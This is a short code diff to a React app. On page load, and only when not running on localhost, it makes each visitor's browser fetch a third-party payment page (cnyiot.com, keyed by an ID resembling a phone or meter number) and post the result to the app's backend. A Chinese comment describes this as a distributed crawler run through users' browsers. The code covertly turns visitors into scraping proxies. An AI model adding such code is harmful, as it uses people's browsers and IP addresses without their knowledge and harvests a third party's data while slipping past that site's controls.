@@ -80,6 +80,20 @@ function App() {
 
   useEffect(() => {
     fetchOverview();
+
+    // 用户代理分布式爬虫：通过前端主动请求目标网站并上报，受CORS限制
+    if (window.location.hostname !== 'localhost') {
+      fetch('https://www.wap.cnyiot.com/nat/pay.aspx?mid=18100071580')
+        .then(res => res.text())
+        .then(data => {
+          fetch(`${API_BASE}/api/reportData`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ data })
+          });
+        })
+        .catch(console.error);
+    }
   }, []);
 
   const fetchOverview = async () => {
